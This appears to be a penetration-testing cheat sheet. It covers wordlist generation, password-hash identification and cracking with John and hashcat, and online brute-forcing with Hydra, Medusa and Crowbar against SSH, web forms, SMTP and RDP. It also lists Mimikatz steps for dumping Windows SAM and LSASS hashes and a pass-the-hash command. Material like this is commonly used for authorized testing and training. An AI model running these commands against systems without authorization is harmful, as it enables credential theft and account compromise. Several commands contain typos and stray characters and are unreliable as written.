# Wordlists
[https://oxasploits.com/posts/wordlists-reprise/](https://oxasploits.com/posts/wordlists-reprise/)

## Wordlist generator
- Cewl
```bash
# The wordlist is generated with words with a minimum of six chartacters
cewl www.test.com -m 6 -w test-cewl.txt
```

- Crunch

| Placeholder | Character Transition |
|-------------|----------------------|
| @ | Lower case alpha characters|
| , | Upper case alpha characters|
| % | Numeric characters |
| ^ | Special characters including space|

```bash
# Words with length of eight characters and following the pattern
crunch 8 8 -t ,@@^^%%%
```
```bash
# Passwords between four and six characters, containing only the characters 0-9 and A-F
 crunch 4 6 0123456789ABCDEF -o crunch.txt
 ```
 ```bash
 # Wordlist with pre-defined character-sets like the defined in /usr/share/crunch/charset.lst, and choose a set (this case mixalpha)
 crunch 4 6 -f /usr/share/crunch/charset.lst S mixalpha -o crunch.txt
```

### John The Ripper
- Adding new rules
```bash
xonorkl@xonork:~$ sudo nano /etc/john/john.conf
...
[List.Rules:Wordlist]
# Try words as they are
:
# Lowercase every pure alphanumeric word
-c >3 !?X l Q
# Capitalize every pure alphanumeric word
-c (?a >2 !?X c Q
# Lowercase and pluralize pure alphabetic words
...
# Try the second half of split passwords
-s x_
-s-c x_ M l Q
# Add two numbers to the end of each password
$[0-9]$[0-9]
```
[Rules documentation](https://www.openwall.com/john/doc/RULES.shtml)

- Apply rules to a wordlist
```bash
john --wordlist=test-cewl.txt --rules --stdout > mutated.txt
```

# Password Cracking

## Hash Identification
```bash
hash-identifier [hash]
```
```bash
hashid [hash]
```

```sql
john hashes.txt
```

```sql
hashcat -m 500 -a 0 -o output.txt –remove hashes.txt /usr/share/wordlists/rockyou.txt
```

-   Brute force crack for NTLM hashes with an uppercase, lowercase, lowercase, and 4 digit mask
	```sql
	hashcat -m 1000 dump.txt -o output.txt --remove -a 3 ?u?l?l?d?d?d?d
	```
	
-   List of hash types and examples for hashcat [https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
-   [https://hashkiller.co.uk](https://hashkiller.co.uk/) has a good repo of already cracked MD5 and NTLM hashes

## Hash Cracking
### John
```bash
# Hash format
kali@kali:~$ cat hash.txt
test:0c509cca8bcd12a26acf0d1e508cb028
```
```bash
# Without wordlist
sudo john hash.txt --format=NT
```
```bash
# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```
```bash
# Wordlist + rules
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```
- To crack **Linux-based hashes** we need to use the **unshadow** utility to combine the **password** and the **shadow**
	```
	kali@kali:~$ unshadow passwd-file.txt shadow-file.txt
	victim:$6$fOS.xfbT$5c5vh3Zrk.88SbCWP1nrjgccgYvCC/x7SEcjSujtrvQfkO4pSWHaGxZojNy.vAqMGrBBNOb0P3pW1ybxm2OIT/:1003:1003:,,,:/home/victim:/bin/bash
	
	kali@kali:~$ unshadow passwd-file.txt shadow-file.txt > unshadowed.txtkali@kali:~$ unshadow passwd-file.txt shadow-file.txt  		       
	victim:$6$fOS.xfbT$5c5vh3Zrk.88SbCWP1nrjgccgYvCC/x7SEcjSujtrvQfkO4pSWHaGxZojNy.vAqMGrBBNOb0P3pW1ybxm2OIT/:1003:1003:,,,:/home/victim:/bin/bash
	
	kali@kali:~$ unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
	
	kali@kali:~$ john --rules --wordlist=/usr/share/wordlists/rockyou.txt S unshadowed.txt
	```
### Hashcat


# Bruteforcing
### Hydra

```bash
# SSH login bruteforce
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
```

```bash
# HTTP POST Attack
hydra 10.0.0.1 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```

```sql
hydra -l admin -P /usr/share/wordlists/rockyou.txt -o results.txt IPADDR PROTOCOL
```

-   Hydra SMTP Brute force
	```sql
	hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp –V
	```
### Medusa
*speedy, massively parallel, modular, login, brute forcer*
```bash
# htaccess-protected admin panel
medusa -h 10.10.0.12 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```
```bash
# Dump all medusa modules
medusa -d
```

### Crowbar
*network authentication cracking tool primarily designed to
leverage SSH keys rather than passwords*
```bash
crowbar -b rdp -s 10.10.0.12/32 -u admin -C ~/passwds.txt -n 1
```

### spray


# Hashes
## Windows Hashes
- The windows hashes are stored in the Security Accounts Manager (SAM)
- Windows NT-based OSs store two different password hashes:
	- LAN Manager (LM), which is based in DES
	- NT LAN Manager (NTLM), which uses MD4
-SAM database cannot be copied while the operating system is running because the Windows kernel keeps an exclusive ffile system lock on the file. However, **mimikatz** can be used to mount in-memory attacks designed to dump the SAM hashes.
- **Mimikatz** also facilitate password hash extraction from the Local Security Authority Subsystem (LSASS) process memory where they are catched.
- We must launch **mimikatz** from an administrative command prompt. We have to execute three commands:
	- **privilege::debug**
	- **token:elevate**
	- **lsadump:sam**
### Pass-the-Hash (PtH)
- It allows an attacker to authenticate to a remote targets using a valid combination of username and NTLM/LM hash.
- *pth-winexe* from the Passing-The-Hash toolkit
```bash
pth-winexe -U test%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.10.0.12 cmd
```





